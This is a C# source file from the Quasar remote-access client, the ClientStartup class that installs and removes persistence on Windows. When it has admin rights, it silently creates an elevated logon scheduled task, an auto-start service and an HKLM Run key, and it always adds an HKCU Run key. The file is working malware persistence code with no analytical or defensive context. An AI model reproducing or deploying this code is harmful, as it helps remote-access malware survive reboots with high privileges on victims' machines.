using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using System.Diagnostics;

namespace Quasar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        // Thank you, Autoruns!
        //https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
        public void AddToStartup(string executablePath, string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);

                startInfo = new ProcessStartInfo("sc")
                {
                    // TODO: Custom name for service
                    Arguments = "create " + startupName.Trim().Replace(' ', '_') + " DisplayName= \"" + startupName + "\" start= auto binPath= \"" + executablePath + "\" error= ignore",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                p = Process.Start(startInfo);
                p.WaitForExit(1000);

                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
            }

            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
        }

        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/delete /tn \"" + startupName + "\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);

                startInfo = new ProcessStartInfo("sc")
                {
                    Arguments = "delete " + startupName.Trim().Replace(' ', '_'),
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                p = Process.Start(startInfo);
                p.WaitForExit(1000);

                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }

            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
        }
    }
}
